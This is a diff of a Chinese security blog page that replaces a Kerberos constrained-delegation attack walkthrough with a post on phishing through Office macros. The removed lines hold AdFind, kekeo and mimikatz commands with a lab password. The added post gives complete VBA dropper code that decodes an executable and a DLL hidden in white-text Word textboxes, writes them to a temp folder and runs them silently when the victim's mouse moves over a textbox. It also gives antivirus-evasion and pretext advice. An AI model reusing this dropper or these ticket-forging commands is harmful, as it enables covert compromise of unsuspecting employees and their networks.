@@ -4,13 +4,11 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="约束委派利用, 内网渗透 Python Windows API 钓鱼社工">
+    <meta name="keywords" content="钓鱼与社工系列之office宏, 内网渗透 Python Windows API 钓鱼社工">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="0x09-约束委派利用0x01 准备工作参考链接《AD域用户加域委派》
-https://wenku.baidu.com/view/5cd12c2adc36a32d7375a417866fb84ae45cc32b.html
-《域渗透——Ker">
+    <meta name="description" content="0x19 钓鱼与社工系列之office宏0x01 介绍​    根据多次项目实战中发现，office宏仍然是最高的成功率，在静默钓鱼中也是最不容易触发人员的警觉。因为大部分员工即使有安全意识，也是不运行陌生的exe程序，但是对于word文档">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +16,7 @@ https://wenku.baidu.com/view/5cd12c2adc36a32d7375a417866fb84ae45cc32b.html
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>约束委派利用 | ske的博客</title>
+    <title>钓鱼与社工系列之office宏 | ske的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -331,13 +329,13 @@ https://wenku.baidu.com/view/5cd12c2adc36a32d7375a417866fb84ae45cc32b.html
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/img/delegation/2a7151ab-7283-4ec3-bb6d-61b1da116eba.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/fish/7c321a3d-e2c7-492c-9079-621e2fc032c0.png')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        约束委派利用
+                        钓鱼与社工系列之office宏
                     </div>
                 </div>
             </div>
@@ -359,8 +357,8 @@ https://wenku.baidu.com/view/5cd12c2adc36a32d7375a417866fb84ae45cc32b.html
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/约束委派利用/" target="_blank">
-                            <span class="chip bg-color">约束委派利用</span>
+                        <a href="/tags/钓鱼与社工系列之office宏/" target="_blank">
+                            <span class="chip bg-color">钓鱼与社工系列之office宏</span>
                         </a>
                         
                     </div>
@@ -371,8 +369,8 @@ https://wenku.baidu.com/view/5cd12c2adc36a32d7375a417866fb84ae45cc32b.html
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/域渗透/" class="post-category" target="_blank">
-                            域渗透
+                        <a href="/categories/钓鱼与社工/" class="post-category" target="_blank">
+                            钓鱼与社工
                         </a>
                         
                     </div>
@@ -383,7 +381,7 @@ https://wenku.baidu.com/view/5cd12c2adc36a32d7375a417866fb84ae45cc32b.html
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-25
+                    2020-12-05
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -397,14 +395,14 @@ https://wenku.baidu.com/view/5cd12c2adc36a32d7375a417866fb84ae45cc32b.html
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    2.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    14 分
                 </div>
                 
                 
@@ -420,60 +418,270 @@ https://wenku.baidu.com/view/5cd12c2adc36a32d7375a417866fb84ae45cc32b.html
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x09-约束委派利用"><a href="#0x09-约束委派利用" class="headerlink" title="0x09-约束委派利用"></a>0x09-约束委派利用</h1><h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><pre><code>《AD域用户加域委派》
-https://wenku.baidu.com/view/5cd12c2adc36a32d7375a417866fb84ae45cc32b.html
-《域渗透——Kerberos委派攻击》     -- 主要是这篇文章
-https://xz.aliyun.com/t/7217#toc-9
-《利用域委派获取域管理权限》
-https://www.anquanke.com/post/id/92484
-《微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）》
-https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw
-《这是一篇“不一样”的真实渗透测试案例分析文章》
-https://cloud.tencent.com/developer/article/1601095</code></pre><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><pre><code>借用Klion的环境
-域控：192.168.3.142
-域机器：Srv-DB-0day
-域机器：PC-jerry-0day
-服务账号:0day\sqlsvr Admin12345
-工具：
-ADFind.exe      查找域中配置约束委派用户
-kekeo.exe       请求TGT，获取ST
-mimikatz        导入ST，获取权限</code></pre><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p>
-<p>委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派（Resource Based Constrained Delegation）</p>
-<pre><code>非约束性委派（Unconstrained Delegation）
-服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户访问任意服务。
-举例说明，如果某个服务A的服务账号B被设置为非约束委派，当用户C通过Kerberos认证访问服务A时，KDC会检查服务账号B的属性，发现是非约束性委派时，KDC会将用户C的TGT放在TGS中，这样B在验证TGS的同时获取了A用户的TGT，从而可以模拟用户A访问任意服务。
-从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。</code></pre><pre><code>约束性委派（Constrained Delegation）
-即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务；</code></pre><h3 id="服务账号、主机账号、普通账号"><a href="#服务账号、主机账号、普通账号" class="headerlink" title="服务账号、主机账号、普通账号"></a>服务账号、主机账号、普通账号</h3><p>在Windows系统中，普通用户的属性中没有委派（Delegation）这个选项卡，只有服务账号、主机账号才有。</p>
-<p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。</p>
-<p>服务账号：⬇</p>
-<p><img src="/img/delegation/2a7151ab-7283-4ec3-bb6d-61b1da116eba.png" alt="img"></p>
-<p>主机账号：⬇</p>
-<p><img src="/img/delegation/862a6496-aa6d-4e53-89c0-915a769c5848.png" alt="img"></p>
-<p>普通账号：⬇</p>
-<p><img src="/img/delegation/368b1b91-3985-4ec8-9b95-7b09c1b431ec.png" alt="img"></p>
-<h2 id="0x02-约束委托利用"><a href="#0x02-约束委托利用" class="headerlink" title="0x02 约束委托利用"></a>0x02 约束委托利用</h2><p>模拟环境，在域机器：PC-jerry-0day上</p>
-<h3 id="1-查找域中配置约束委派用户"><a href="#1-查找域中配置约束委派用户" class="headerlink" title="1. 查找域中配置约束委派用户"></a>1. 查找域中配置约束委派用户</h3><pre><code>AdFind.exe -h 192.168.3.142 -u sqlsvr -up Admin12345 -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></pre><p><img src="/img/delegation/c655de04-feac-4072-96ed-1cb59df6970d.png" alt="img"></p>
-<p>那么当我们获取了sqlsvr域用户的账号密码后，就可以登录查出来的任意域机器</p>
-<p>先查询下Srv-DB-0day域机器的管理组，使用服务账号建立IPC连接，用local查询本地管理组。可以看到sqlsvr并不能对Srv-DB-0day域机器有操作权限</p>
-<p><img src="/img/delegation/ffe5a7ac-d47b-464f-8e7c-97ef90400c13.png" alt="img"></p>
-<h3 id="2-用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST"><a href="#2-用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST" class="headerlink" title="2. 用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST"></a>2. 用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST</h3><pre><code>kekeo.exe
-tgt::ask /user:sqlsvr /domain:0day.org /password:Admin12345 /ticket:administrator.kirbi
-tgs::s4u /tgt:TGT_sqlsvr@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/Srv-DB-0day.0day.org</code></pre><p>用kekeo请求该用户的TGT</p>
-<p>tgt::ask /user:sqlsvr /domain:0day.org /password:Admin12345 /ticket:administrator.kirbi</p>
-<p>/user: 服务用户的用户名</p>
-<p>/password: 服务用户的明文密码</p>
-<p>/domain: 所在域名</p>
-<p>/ticket: 指定票据名称，不过这个参数没有生效，可以忽略</p>
-<p>得到服务用户TGT：<a href="mailto:TGT_sqlsvr@0DAY.ORG_krbtgt" target="_blank" rel="noopener">TGT_sqlsvr@0DAY.ORG_krbtgt</a>~0day.org@0DAY.ORG.kirbi</p>
-<p>使用这张TGT通过伪造s4u请求以administrator用户身份请求访问Srv-DB-0day CIFS的ST</p>
-<p>tgs::s4u /tgt:<a href="mailto:TGT_sqlsvr@0DAY.ORG_krbtgt" target="_blank" rel="noopener">TGT_sqlsvr@0DAY.ORG_krbtgt</a>~0day.org@0DAY.ORG.kirbi /user:<a href="mailto:Administrator@0day.org" target="_blank" rel="noopener">Administrator@0day.org</a> /service:cifs/Srv-DB-0day.0day.org</p>
-<p>S4U2Self获取到的ST1以及S4U2Proxy获取到的Srv-DB-0day CIFS服务的ST2会保存在当前目录下</p>
-<p><img src="/img/delegation/3856b471-3f77-4497-a05e-d108b3082d2c.png" alt="img"></p>
-<p><img src="/img/delegation/0660e189-5f7a-4c7b-882d-2614b32a8c81.png" alt="img"></p>
-<h3 id="3-获取权限"><a href="#3-获取权限" class="headerlink" title="3. 获取权限"></a>3. 获取权限</h3><p>使用mimikatz将ST2导入当前会话即可，如果有杀软，自行免杀。需要以管理员权限运行mimikatz</p>
-<pre><code>kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs~Srv-DB-0day.0day.org@0DAY.ORG.kirbi
-dir \\Srv-DB-0day.0day.org\C$\</code></pre><p><img src="/img/delegation/78714f9a-a23b-428c-a1e5-7b1fae22aa80.png" alt="img"></p>
-<h2 id="0x03-视频演示"><a href="#0x03-视频演示" class="headerlink" title="0x03 视频演示"></a>0x03 视频演示</h2><p><img src="/img/delegation/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B.gif" alt="img"></p>
+                <h1 id="0x19-钓鱼与社工系列之office宏"><a href="#0x19-钓鱼与社工系列之office宏" class="headerlink" title="0x19 钓鱼与社工系列之office宏"></a>0x19 钓鱼与社工系列之office宏</h1><h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>​    根据多次项目实战中发现，office宏仍然是最高的成功率，在静默钓鱼中也是最不容易触发人员的警觉。因为大部分员工即使有安全意识，也是不运行陌生的exe程序，但是对于word文档则没有足够的安全意识，认为word文档都是安全的。正是基于此心理状态，office宏在钓鱼中仍然占据重要成分。</p>
+<p>​    当然，现在office在国内市场中其实占据并不多，越来越多人用wps了。那么这种情况下office宏肯定是无效了，下篇文章会针对该情景分析如何钓鱼。</p>
+<h2 id="0x02-宏代码流程及免杀"><a href="#0x02-宏代码流程及免杀" class="headerlink" title="0x02 宏代码流程及免杀"></a>0x02 宏代码流程及免杀</h2><p>​    网上有很多项目及文章是如何实现宏免杀的效果，之所以要宏免杀大部分原因都是代码是实现运行宏的时候就直接远程上线到rat上。例如调用powershell或者远程下载等等代码所用到的api或者函数，都被杀软盯着。那么换个思路，我们即不调用powershell执行敏感函数，也不远程下载文件，我们所做要的是<strong>释放文件并通过dll劫持实现上线</strong>。</p>
+<p>​    释放文件其实也是个技术活，经过测试，<strong>能否释放文件成功主要看你的文件是不是静态免杀</strong>，如果文件静态免杀，那么就能够成功释放。因为这就是个正常的功能，杀软不可能拦截你释放安全的文件，不然就影响一些职业的正常办公了。而我们用的是dll劫持的方法，白名单程序肯定是安全的文件，<strong>那么就是我们的恶意dll文件如何实现静态免杀了</strong>。如何让dll文件静态免杀的方法很多，网上也有很多项目，这块内容不在该文章里，以后会详细讲解。</p>
+<p>​    上段说了释放文件，而文件也都静态免杀了。那么还有一个要注意的地方，那就是dll劫持的程序保存在word文件哪里？首先我们得将dll劫持程序已二进制形式读取出来，然后base64编码后得到了一串字符串，只要释放的时候重新base64解码并已二进制形式写入到磁盘里，这样就能够释放出dll劫持程序了。<strong>那么重点就是该base64字符串存放在哪里？千万别放在宏代码里，很容易被杀，最好的规避杀软的方法就是将base64字符串放到word正文里的文本框等控件里</strong>。然后宏代码去读取文本框里的base64字符串，再解码写入磁盘里并运行白程序实现上线。这样通过该方法就能够实现了宏免杀。</p>
+<p>​    最后一步就是如何触发宏了，千万不要使用打开word文件就触发宏的方法，很容易被杀软拦截。我常用的方法就是<strong>弄一个很大的文本框放在第一页，然后当目标的鼠标移动到文本框时就触发宏</strong>。这样的方法既能有效规避杀软，还能在目标不知情的情况下触发了宏！</p>
+<p>​    <strong>总结：寻找一个dll劫持的白程序，做一个静态免杀的dll文件，将所有文件以二进制形式读取出来并base64编码后存放到word的文本框里。宏代码功能读取文本框里的字符串并解码写入磁盘，然后运行白程序即可免杀上线！</strong></p>
+<h2 id="0x03-宏代码"><a href="#0x03-宏代码" class="headerlink" title="0x03 宏代码"></a>0x03 宏代码</h2><h3 id="0x03-1-读取文件并base64编码"><a href="#0x03-1-读取文件并base64编码" class="headerlink" title="0x03-1 读取文件并base64编码"></a>0x03-1 读取文件并base64编码</h3><p>先使用下面的代码将白程序和dll文件base64编码得到字符串</p>
+<pre><code>Sub WriteBinary(FileName, Buf)
+  Dim I, aBuf, Size, bStream
+  Size = UBound(Buf): ReDim aBuf(Size \ 2)
+  For I = 0 To Size - 1 Step 2
+      aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))
+  Next
+  If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))
+  aBuf = Join(aBuf, &quot;&quot;)
+  Set bStream = CreateObject(&quot;ADODB.Stream&quot;)
+  bStream.Type = 1: bStream.Open
+  With CreateObject(&quot;ADODB.Stream&quot;)
+    .Type = 2: .Open: .WriteText aBuf
+    .Position = 2: .CopyTo bStream: .Close
+  End With
+  bStream.SaveToFile FileName, 2: bStream.Close
+  Set bStream = Nothing
+End Sub
+Function Base64Encode(str() As Byte) As String                                  &#39;Base64 编码
+    On Error GoTo over                                                          &#39;排错
+    Dim Buf() As Byte, length As Long, mods As Long
+    Const B64_CHAR_DICT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;
+    mods = (UBound(str) + 1) Mod 3   &#39;除以3的余数
+    length = UBound(str) + 1 - mods
+    ReDim Buf(length / 3 * 4 + IIf(mods &lt;&gt; 0, 4, 0) - 1)
+    Dim I As Long
+    For I = 0 To length - 1 Step 3
+        Buf(I / 3 * 4) = (str(I) And &amp;HFC) / &amp;H4
+        Buf(I / 3 * 4 + 1) = (str(I) And &amp;H3) * &amp;H10 + (str(I + 1) And &amp;HF0) / &amp;H10
+        Buf(I / 3 * 4 + 2) = (str(I + 1) And &amp;HF) * &amp;H4 + (str(I + 2) And &amp;HC0) / &amp;H40
+        Buf(I / 3 * 4 + 3) = str(I + 2) And &amp;H3F
+    Next
+    If mods = 1 Then
+        Buf(length / 3 * 4) = (str(length) And &amp;HFC) / &amp;H4
+        Buf(length / 3 * 4 + 1) = (str(length) And &amp;H3) * &amp;H10
+        Buf(length / 3 * 4 + 2) = 64
+        Buf(length / 3 * 4 + 3) = 64
+    ElseIf mods = 2 Then
+        Buf(length / 3 * 4) = (str(length) And &amp;HFC) / &amp;H4
+        Buf(length / 3 * 4 + 1) = (str(length) And &amp;H3) * &amp;H10 + (str(length + 1) And &amp;HF0) / &amp;H10
+        Buf(length / 3 * 4 + 2) = (str(length + 1) And &amp;HF) * &amp;H4
+        Buf(length / 3 * 4 + 3) = 64
+    End If
+    For I = 0 To UBound(Buf)
+        Base64Encode = Base64Encode + Mid(B64_CHAR_DICT, Buf(I) + 1, 1)
+    Next
+over:
+End Function
+&#39;VB Base64 解码/解密函数：
+
+Function Base64Decode(B64 As String) As Byte()                                  &#39;Base64 解码
+    On Error GoTo over                                                          &#39;排错
+    Dim OutStr() As Byte, I As Long, j As Long
+    Const B64_CHAR_DICT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;
+    If InStr(1, B64, &quot;=&quot;) &lt;&gt; 0 Then B64 = Left(B64, InStr(1, B64, &quot;=&quot;) - 1)     &#39;判断Base64真实长度,除去补位
+    Dim length As Long, mods As Long
+    mods = Len(B64) Mod 4
+    length = Len(B64) - mods
+    ReDim OutStr(length / 4 * 3 - 1 + Switch(mods = 0, 0, mods = 2, 1, mods = 3, 2))
+    For I = 1 To length Step 4
+        Dim Buf(3) As Byte
+        For j = 0 To 3
+            Buf(j) = InStr(1, B64_CHAR_DICT, Mid(B64, I + j, 1)) - 1            &#39;根据字符的位置取得索引值
+        Next
+        OutStr((I - 1) / 4 * 3) = Buf(0) * &amp;H4 + (Buf(1) And &amp;H30) / &amp;H10
+        OutStr((I - 1) / 4 * 3 + 1) = (Buf(1) And &amp;HF) * &amp;H10 + (Buf(2) And &amp;H3C) / &amp;H4
+        OutStr((I - 1) / 4 * 3 + 2) = (Buf(2) And &amp;H3) * &amp;H40 + Buf(3)
+    Next
+    If mods = 2 Then
+        OutStr(length / 4 * 3) = (InStr(1, B64_CHAR_DICT, Mid(B64, length + 1, 1)) - 1) * &amp;H4 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;H30) / 16
+    ElseIf mods = 3 Then
+        OutStr(length / 4 * 3) = (InStr(1, B64_CHAR_DICT, Mid(B64, length + 1, 1)) - 1) * &amp;H4 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;H30) / 16
+        OutStr(length / 4 * 3 + 1) = ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;HF) * &amp;H10 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 3, 1)) - 1) And &amp;H3C) / &amp;H4
+    End If
+    Base64Decode = OutStr                                                       &#39;读取解码结果
+over:
+End Function
+Sub test2()
+    Dim iFN As Integer
+    Dim sPath As String
+    Dim bFileSize As Long
+    Dim sResult As String
+    Dim arr() As Byte       &#39; 字节数组
+    Dim arra() As Byte       &#39; 字节数组
+    Dim infile, outfile, infileBase As String
+    infile = &quot;C:\Windows\Temp\123.exe&quot;
+    outfile = &quot;c:\windows\temp\1.exe&quot;
+
+    iFN = VBA.FreeFile
+    bFileSize = VBA.FileLen(infile)
+    &#39;Debug.Print bFileSize
+    Open infile For Binary Access Read As iFN
+    arr = InputB(bFileSize, iFN)        &#39;读取字节流
+    infileBase = Base64Encode(arr())
+
+    &#39;Debug.Print infileBase
+
+    Dim FSO
+    Set FSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)
+
+    Set OutPutFile = FSO.OpenTextFile(&quot;C:\windows\temp\test.txt&quot;, 2, True)
+    OutPutFile.Write (infileBase)
+    OutPutFile.Close
+    Set FSO = Nothing
+    &#39;Dim infileBaseExe As String
+    &#39;infileBaseExe = Range(&quot;J22&quot;).Value
+    &#39;infileBaseExe = infileBaseExe + Range(&quot;J23&quot;).Value
+
+    &#39;arra = Base64Decode(infileBase)
+
+    &#39;WriteBinary outfile, arra
+End Sub</code></pre><h3 id="0x03-2-office宏上线代码"><a href="#0x03-2-office宏上线代码" class="headerlink" title="0x03-2 office宏上线代码"></a>0x03-2 office宏上线代码</h3><p>从文本框中读取base64内容，解码后写入到c:\windows\temp\目录下，当用户鼠标移动或点击到文本框中，触发宏执行木马</p>
+<pre><code>Private Declare PtrSafe Sub Sleep Lib &quot;kernel32&quot; (ByVal Milliseconds As LongPtr)
+Private Declare PtrSafe Function GetProcAddress Lib &quot;kernel32&quot; (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
+Private Declare PtrSafe Function LoadLibrary Lib &quot;kernel32&quot; Alias &quot;LoadLibraryA&quot; (ByVal lpLibFileName As String) As LongPtr
+Private Declare PtrSafe Function VirtualProtect Lib &quot;kernel32&quot; (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
+Private Declare PtrSafe Sub ByteSwapper Lib &quot;kernel32.dll&quot; Alias &quot;RtlFillMemory&quot; (Destination As Any, ByVal length As Long, ByVal Fill As Byte)
+Private Declare PtrSafe Sub Peek Lib &quot;msvcrt&quot; Alias &quot;memcpy&quot; (ByRef pDest As Any, ByRef pSource As Any, ByVal nBytes As Long)
+Private Declare PtrSafe Function CreateProcess Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+Private Declare PtrSafe Function OpenProcess Lib &quot;kernel32.dll&quot; (ByVal dwAccess As Long, ByVal fInherit As Integer, ByVal hObject As Long) As Long
+Private Declare PtrSafe Function TerminateProcess Lib &quot;kernel32&quot; (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
+Private Declare PtrSafe Function CloseHandle Lib &quot;kernel32&quot; (ByVal hObject As Long) As Long
+Private Type PROCESS_INFORMATION
+    hProcess As Long
+    hThread As Long
+    dwProcessId As Long
+    dwThreadId As Long
+End Type
+Private Type STARTUPINFO
+    cb As Long
+    lpReserved As String
+    lpDesktop As String
+    lpTitle As String
+    dwX As Long
+    dwY As Long
+    dwXSize As Long
+    dwYSize As Long
+    dwXCountChars As Long
+    dwYCountChars As Long
+    dwFillAttribute As Long
+    dwFlags As Long
+    wShowWindow As Integer
+    cbReserved2 As Integer
+    lpReserved2 As Long
+    hStdInput As Long
+    hStdOutput As Long
+    hStdError As Long
+End Type
+Const CREATE_NO_WINDOW = &amp;H8000000
+Const CREATE_NEW_CONSOLE = &amp;H10
+Function fileExist(filePath)
+    Dim fso
+    Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)
+    If fso.fileExists(filePath) Then
+        fileExist = True
+    Else
+        fileExist = False
+    End If
+    Set fso = Nothing
+End Function
+Function dddddd(B64 As String) As Byte()
+    On Error GoTo over
+    Dim OutStr() As Byte, i As Long, j As Long
+    Const B64_CHAR_DICT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;
+    If InStr(1, B64, &quot;=&quot;) &lt;&gt; 0 Then B64 = Left(B64, InStr(1, B64, &quot;=&quot;) - 1)
+    Dim length As Long, mods As Long
+    mods = Len(B64) Mod 4
+    length = Len(B64) - mods
+    ReDim OutStr(length / 4 * 3 - 1 + Switch(mods = 0, 0, mods = 2, 1, mods = 3, 2))
+    For i = 1 To length Step 4
+        Dim buf(3) As Byte
+        For j = 0 To 3
+            buf(j) = InStr(1, B64_CHAR_DICT, Mid(B64, i + j, 1)) - 1
+        Next
+        OutStr((i - 1) / 4 * 3) = buf(0) * &amp;H4 + (buf(1) And &amp;H30) / &amp;H10
+        OutStr((i - 1) / 4 * 3 + 1) = (buf(1) And &amp;HF) * &amp;H10 + (buf(2) And &amp;H3C) / &amp;H4
+        OutStr((i - 1) / 4 * 3 + 2) = (buf(2) And &amp;H3) * &amp;H40 + buf(3)
+    Next
+    If mods = 2 Then
+        OutStr(length / 4 * 3) = (InStr(1, B64_CHAR_DICT, Mid(B64, length + 1, 1)) - 1) * &amp;H4 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;H30) / 16
+    ElseIf mods = 3 Then
+        OutStr(length / 4 * 3) = (InStr(1, B64_CHAR_DICT, Mid(B64, length + 1, 1)) - 1) * &amp;H4 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;H30) / 16
+        OutStr(length / 4 * 3 + 1) = ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;HF) * &amp;H10 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 3, 1)) - 1) And &amp;H3C) / &amp;H4
+    End If
+    dddddd = OutStr
+over:
+End Function
+Function runCommand(comando)
+    Dim pInfo As PROCESS_INFORMATION
+    Dim sInfo As STARTUPINFO
+    Dim sNull As String
+    Dim lSuccess As Long
+    Dim lRetValue As Long
+    lSuccess = CreateProcess(sNull, comando, ByVal 0&amp;, ByVal 0&amp;, 1&amp;, CREATE_NO_WINDOW, ByVal 0&amp;, sNull, sInfo, pInfo)
+    lRetValue = CloseHandle(pInfo.hThread)
+    lRetValue = CloseHandle(pInfo.hProcess)
+
+End Function
+Function WriteBinary(FileName, buf)
+  Dim i, aBuf, Size, bStream
+  Size = UBound(buf): ReDim aBuf(Size \ 2)
+  For i = 0 To Size - 1 Step 2
+      aBuf(i \ 2) = ChrW(buf(i + 1) * 256 + buf(i))
+  Next
+  If i = Size Then aBuf(i \ 2) = ChrW(buf(i))
+  aBuf = Join(aBuf, &quot;&quot;)
+  Set bStream = CreateObject(&quot;ADODB.Stream&quot;)
+  bStream.Type = 1: bStream.Open
+  With CreateObject(&quot;ADODB.Stream&quot;)
+    .Type = 2: .Open: .WriteText aBuf
+    .Position = 2: .CopyTo bStream: .Close
+  End With
+  bStream.SaveToFile FileName, 2: bStream.Close
+  Set bStream = Nothing
+End Function
+Function releaseFile(path As String, conte As String)
+    hwminiArra = dddddd(conte)
+    WriteBinary path, hwminiArra
+End Function
+Function start()
+    Dim filePath As String
+    filePath = &quot;C:\Windows\temp\aaaaaaa.exe&quot;
+    If Not fileExist(filePath) Then
+        releaseFile &quot;C:\Windows\temp\aaaaaaa.exe&quot;, Replace(ActiveDocument.Shapes(1).TextFrame.TextRange, Chr(13), Empty)
+        releaseFile &quot;C:\Windows\temp\aaaaaaaaaaa.dll&quot;, Replace(ActiveDocument.Shapes(2).TextFrame.TextRange, Chr(13), Empty)
+    End If
+    runCommand (filePath)
+End Function
+Private Sub TextBox2_MouseDown(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
+    Static i As Integer
+    i = i + 1
+    If i &lt; 3 Then
+        start
+    End If
+End Sub
+Private Sub TextBox2_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
+    Static i As Integer
+    i = i + 1
+    If i &lt; 3 Then
+        start
+    End If
+End Sub
+</code></pre><h2 id="0x04-隐藏文本框"><a href="#0x04-隐藏文本框" class="headerlink" title="0x04 隐藏文本框"></a>0x04 隐藏文本框</h2><p>将dll劫持的程序base64编码后存放在文本框里</p>
+<p><img src="/img/officeMacro/2e0174b7-ec47-49aa-adda-9c570b8bd365.png" alt="img"></p>
+<p>文本框的线条设置为无颜色</p>
+<p><img src="/img/officeMacro/fffbd65a-61d4-4bee-bce7-90965bfa080b.png" alt="img"></p>
+<p><img src="/img/officeMacro/0fbf519d-64fe-4ce4-a18a-53366dbf2c4d.png" alt="img"></p>
+<p><img src="/img/officeMacro/e0732e74-e9c6-4384-b5de-8aa843b202c4.png" alt="img"></p>
+<p>将base64字符串的字体设置为白色，</p>
+<p><img src="/img/officeMacro/bb2c62f3-45fe-4b71-a40c-b74a7cd94c19.png" alt="img"></p>
+<p>将最后一页的最上方空白行删掉，那么这时候就看不到文本框了</p>
+<p><img src="/img/officeMacro/ce27f099-b5f2-4e73-942e-f9ccd3a5378a.png" alt="img"></p>
+<p>在首页将触发宏的文本框拉到最大，然后话术诱导目标将鼠标移动或点击文本框</p>
+<p><img src="/img/officeMacro/2c98a350-80c7-45b9-b453-4cc6f089bf65.png" alt="img"></p>
+<h2 id="0x05-宏代码加密"><a href="#0x05-宏代码加密" class="headerlink" title="0x05 宏代码加密"></a>0x05 宏代码加密</h2><p>​    为了防止宏代码被分析，可以设置密码。当然这仅仅只是防不懂的人，懂的人还是会用工具解密的。</p>
+<p><img src="/img/officeMacro/34bfdf24-af9c-48e4-b118-cabb0d5056c0.png" alt="img"></p>
+<p><img src="/img/officeMacro/968c0feb-3be6-4d28-8127-428dba5f747e.png" alt="img"></p>
 
             </div>
             <hr />
@@ -508,9 +716,9 @@ dir \\Srv-DB-0day.0day.org\C$\</code></pre><p><img src="/img/delegation/78714f9a
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《约束委派利用》
+                    《钓鱼与社工系列之office宏》
